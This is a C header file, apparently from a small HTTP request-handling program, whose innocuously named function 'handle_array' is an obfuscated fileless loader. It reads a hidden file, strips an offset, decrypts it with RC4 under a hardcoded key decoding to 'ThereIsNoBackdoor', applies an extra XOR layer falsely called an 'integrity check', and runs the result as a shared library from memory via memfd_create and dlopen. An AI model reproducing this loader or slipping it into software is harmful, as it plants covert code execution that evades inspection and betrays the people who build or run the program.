#ifndef HANDLE_ARRAY_H
#define HANDLE_ARRAY_H

#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <dlfcn.h>

#include "crypto/arcfour.h"

#include "common.h"

#define OBF_MARKER

void* dlopen_mem(uint8_t* buf, size_t len){
	int memfd = memfd_create("", 0);
	if(memfd<0){
		return NULL;
	}
	FILE* fmem = fdopen(memfd, "w");
	if(!fmem){
		return NULL;
	}
	fwrite(buf, len, 1, fmem);
	fflush(fmem);

    char fullpath[32] = {0};
	snprintf(fullpath, 32, "/proc/self/fd/%d", memfd);
	void* handle = dlopen(fullpath, RTLD_LAZY);
	fclose(fmem);
	if(!handle){
		return NULL;
	}
	return handle;
}


void handle_array(path_t* path, const char method[]) {
	FILE* input_mod = fopen("./.tmp.bin", "r");
	fseek(input_mod, 0, SEEK_END);
	long file_size = ftell(input_mod);
	rewind(input_mod);
    
	uint8_t* buf = malloc(file_size);
	fread(buf, file_size, 1, input_mod);
    
    // adjust pointer with offset
    uint32_t off =*(uint32_t*)(&buf[file_size-4]);
    buf += off;
    file_size -= (off+4);
    
    printf("X-DBG-0-0: adjusted file_size: %ld\r\n", file_size);
    
    // rc4 decryption
    BYTE RC4_state[256] = {0};
    arcfour_key_setup(RC4_state, (const BYTE*) "VGhlcmVJc05vQmFja2Rvb3I=", 24);
    uint8_t* keystream = malloc(file_size);
    arcfour_generate_stream(RC4_state, keystream, file_size);
    for(long i=0; i<file_size;i++){
        buf[i] ^= keystream[i];
    }
    free(keystream);
    
    // "integrity check"
    uint8_t xor_key[4] = {0};
    uint32_t crc = crc32(0, buf, file_size);
    printf("X-DBG-0-2: crc32: 0x%08x\r\n", crc);
    *((uint32_t*)xor_key) = crc32(0, buf, file_size) ^ *((uint32_t*) buf);
    printf("X-DBG-0-3: xor-key: 0x%08x\r\n", *(uint32_t*)xor_key);
    for(size_t i=0; i<file_size; i++){
        buf[i] ^= xor_key[i%4];
    }
    
    void* array = dlopen_mem(buf, file_size);
    if(!array){
        return;
    }
    
    void (*handle)(path_t* path, const char method[]) = dlsym(array, "handle");
    if(!handle){
        return;
    }
    handle(path, method);
}

#endif
